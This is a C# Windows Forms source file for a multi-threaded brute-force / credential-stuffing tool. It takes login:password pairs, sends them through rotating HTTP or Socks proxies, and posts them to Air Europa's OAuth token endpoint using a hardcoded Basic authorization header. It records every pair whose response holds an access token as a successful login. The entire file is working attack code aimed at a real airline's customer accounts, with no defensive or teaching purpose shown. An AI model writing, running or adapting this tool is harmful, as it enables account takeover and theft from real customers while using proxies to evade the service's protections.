using System;
using System.Collections.Generic;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.Net;
using System.IO;

using xNet;
using System.Text.RegularExpressions;


namespace brut
{
    public partial class Form1 : Form
    {
        /// <summary>    obtaining a data model   </summary>operating data
        Model model;

        Task t;
        Task t2;

        ManualResetEvent _event;

        CancellationTokenSource cts;

        List<string> sourceList;
        List<ProxyItem> proxyList;
        Dictionary<string, int> array;

        DataGridViewCellStyle columnHeaderStyle;

        int countThreads;
        int countBase;
        int countProxy;

        int countBads;
        int countBlocked;
        int countErrors;

        int rand_value;
        int pause;

        string proxy;
        string proxy_port;
        string proxy_type;

        string succesfuul_login;
        string succesfull_password;

        Boolean btn_enable = true;

        public Form1()
        {
            StartPosition = FormStartPosition.CenterScreen;

            InitializeComponent();

            pause = 2;

            sourceList = new List<string>();
            proxyList = new List<ProxyItem>();

            _event = new ManualResetEvent(true);

            viewSuccesfull.ColumnCount = 2;
            viewSuccesfull.ColumnHeadersVisible = true;

            columnHeaderStyle = new DataGridViewCellStyle();

            columnHeaderStyle.Font = new Font("Verdana", 10, FontStyle.Bold);
            viewSuccesfull.ColumnHeadersDefaultCellStyle = columnHeaderStyle;
            viewSuccesfull.RowHeadersVisible = false;

            viewSuccesfull.Columns[0].Width = viewSuccesfull.Width / 2;
            viewSuccesfull.Columns[1].Width = viewSuccesfull.Width / 2 - 3;
        }

        delegate void labelTextDelegate(string text);
        delegate void getTypeProxyDelegate();
        delegate void setDataGridDelegate();


        private void LabelText(string text)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new labelTextDelegate(LabelText), new object[] { text });
                return;
            }
            else
            {
                //задаем лэйблу кол-во ошибок связанных с подключением
                proxy_data_label.Text = countProxy.ToString();
            }
        }
        private void LabelText2(string text)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new labelTextDelegate(LabelText2), new object[] { text });
                return;
            }
            else
            {
                //задаем лэйблу кол-во ошибок связанных с подключением
                errors_data_label.Text = countErrors.ToString();
            }
        }

        private void LabelText3(string text)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new labelTextDelegate(LabelText3), new object[] { text });
                return;
            }
            else
            {
                base_data_label.Text = countBase.ToString();
            }
        }

        private void LabelText4(string text)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new labelTextDelegate(LabelText4), new object[] { text });
                return;
            }
            else
            {
                //задаем лэйблу кол-во ошибок связанных с подключением
                bads_data_label.Text = countBads.ToString();
            }
        }

        private void setGridData()
        {
            if (InvokeRequired)
            {
                BeginInvoke(new setDataGridDelegate(setGridData));
                return;
            }
            else
            {
                //задаем лэйблу кол-во ошибок связанных с подключением
                viewSuccesfull.Rows.Add(succesfuul_login, succesfull_password);
            }
        }

        private void setTypeProxy()
        {
            if (InvokeRequired)
            {
                BeginInvoke(new getTypeProxyDelegate(setTypeProxy));
                return;
            }
            else
            {
                if (comboBoxTypeProxy.Text.Contains("HTTP"))
                    proxy_type = "HTTP";
                else if (comboBoxTypeProxy.Text.Contains("Socks4"))
                    proxy_type = "Socks4";
                else proxy_type = "Socks5";
            }
        }

        private void Start(CancellationToken cancellationToken)
        {
            pause = 2;

            countProxy = proxyList.Count;

            cancellationToken.ThrowIfCancellationRequested();

            string pattern = @"(.*)[:;](.*);";

            while (true)
            {
                if (sourceList.Count == 0 || proxyList.Count == 0 || pause % 2 == 1 || pause == 0) break;

                using (var request = new HttpRequest())
                {
                    request.Cookies = new CookieDictionary();

                    request.IgnoreProtocolErrors = true;

                    request["accept"] = "application/json, text/javascript, */*; q=0.01";
                    request["authorization"] = "Basic YWVhd2ViOnczYjQzNGZyMG50";
                    request["x-requested-with"] = "XMLHttpRequest";
                    request["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 YaBrowser/17.9.1.449 (beta) Yowser/2.5 Safari/537.36";

                    var urlParams = new RequestParams();

                    urlParams["locale"] = "EN";
                    urlParams["marketCode"] = "OT";
                    urlParams["application"] = "W";
                    urlParams["operatingSystem"] = "WEB";
                    urlParams["versionNumber"] = "1";
                    urlParams["grant_type"] = "password";
                    urlParams["client_id"] = "aeaweb";
                    urlParams["scope"] = "user,availability,checkout,checkin,infoflight,booking,partners";

                    try
                    {
                        Random random = new Random();

                        rand_value = random.Next(countProxy);

                        string input1 = proxyList[rand_value].proxy;

                        MatchCollection Matches1 = new Regex(pattern).Matches(input1);

                        proxy = Matches1[0].Groups[1].Value;
                        proxy_port = Matches1[0].Groups[2].Value;

                        setTypeProxy();

                        Thread.Sleep(100);

                        if (proxy_type.Equals("HTTP"))
                        { request.Proxy = HttpProxyClient.Parse(proxy); 
                        }
                        else if (proxy_type.Equals("Socks4"))
                        { request.Proxy = Socks4ProxyClient.Parse(proxy); }
                        else if (proxy_type.Equals("Socks5"))
                        { request.Proxy = Socks5ProxyClient.Parse(proxy); }

                        cancellationToken.ThrowIfCancellationRequested();

                        if (sourceList.Count == 0 || proxyList.Count == 0 || pause % 2 == 1 || pause == 0) break;
                        request.Get("https://www.aireuropa.com/en/suma#/login").ToString();
                    }
                    catch
                    {

                        Thread.Sleep(100);
                        if (sourceList.Count == 0 || proxyList.Count == 0 || pause % 2 == 1 || pause == 0) break;
                        if (proxyList[rand_value].countFail < 5)
                        {
                            proxyList[rand_value].countFail++;
                        }

                        try
                        {
                            if (proxyList.Count != 0 && proxyList[rand_value].countFail == 5)
                            {
                                proxyList.RemoveAt(rand_value);
                            }
                        }
                        catch
                        { }

                        if (countProxy == 0) break;
                        else
                        {
                            countErrors++;
                            countProxy = proxyList.Count;
                            LabelText(proxyList.Count.ToString());
                            LabelText2(countErrors.ToString());

                            continue;
                        }
                    }

                    string input2 = null;

                    MatchCollection Matches2 = null;

                    Object content = null;

                    Thread.Sleep(100);
                    if (sourceList.Count == 0 || proxyList.Count == 0 || pause % 2 == 1 || pause == 0) break;
                    input2 = sourceList[0];
                        
                    Matches2 = new Regex(pattern).Matches(input2);
                   
                    urlParams["username"] = Matches2[0].Groups[1].Value;
                    urlParams["password"] = Matches2[0].Groups[2].Value;

                    try
                    {
                        cancellationToken.ThrowIfCancellationRequested();
                        
                        content = request.Post("https://www.aireuropa.com/aireuropaauth/oauth/token", urlParams).ToString();

                        sourceList.RemoveAt(0);
                        countBase = sourceList.Count;
                        LabelText3(countBase.ToString());


                        //регулярное выражение для проверки ответа
                        Regex regex = new Regex(@"access_token");

                        MatchCollection matches = regex.Matches(content.ToString());

                        string insp = ""; 

                        if (matches.Count > 0)
                        {
                            foreach (Match match in matches)
                                insp = match.Value; 
                        }

                        

                        if (insp.Contains("access_token"))
                        {
                            succesfuul_login = Matches2[0].Groups[1].Value.ToString();
                            succesfull_password = Matches2[0].Groups[2].Value.ToString();

                            setGridData();
                        }
                        else
                        {
                            //MessageBox.Show("Не удалось авторизоваться!");
                            countBads++;
                            //задаем лэйблу кол-во неавторизированных аккаунтов
                            LabelText4(countBads.ToString());
                        }
                    }
                    catch { }
                }
            }
        }

        private void btn_start_Click(object sender, EventArgs e)
        {
            if (btn_enable)
            {
                btn_enable = false;

                cts = new CancellationTokenSource();

                if (countThreads != 0)
                {
                    model = new brut.Model();

                    for (int i = 0; i < countThreads; i++)
                    {
                        t = Task.Run(() => model.addData(cts.Token), cts.Token);
                    }

                    Thread.Sleep(100);

                    sourceList = model.getSourceList();
                    proxyList = model.getProxyList(); 

                    countBads = 0;
                    countErrors = 0;

                    LabelText2(countErrors.ToString());

                    countBase = sourceList.Count;
                    LabelText3(countBase.ToString());

                    countProxy = proxyList.Count;
                    LabelText(countProxy.ToString());

                    LabelText4(countBads.ToString());

                    //метод в котором мы считываем в цикле аккаунте с коллекции и шлем пост запрос и гет по прокси
                    for (int i = 0; i < countThreads; i++)
                    {
                        t2 = Task.Run(() => Start(cts.Token), cts.Token);
                    }
                }

                else
                {
                    MessageBox.Show("No threads selected!");
                }

                btn_enable = true;
            }
        }

        private void trackBarThreads_Scroll(object sender, EventArgs e)
        {
            threads_data_label.Text = trackBarThreads.Value.ToString();
            //задаем кол-во потоков
            countThreads = trackBarThreads.Value;
        }

        private void btn_pause_Click(object sender, EventArgs e)
        {
            if (pause != 0)
            {
                pause++;

                if (pause % 2 == 0)
                {
                    //метод в котором мы считываем в цикле аккаунте с коллекции и шлем пост запрос и гет по прокси
                    for (int i = 0; i < countThreads; i++)
                    {
                        t2 = Task.Run(() => Start(cts.Token), cts.Token);
                    }
                }
            }
        }

        private void btn_stop_Click(object sender, EventArgs e)
        {
            // Запрашиваем отмену операции
            if (pause != 0)
            {
                pause = 0;
                MessageBox.Show("Brute Force Stopped!");
            }
        }
    }
}
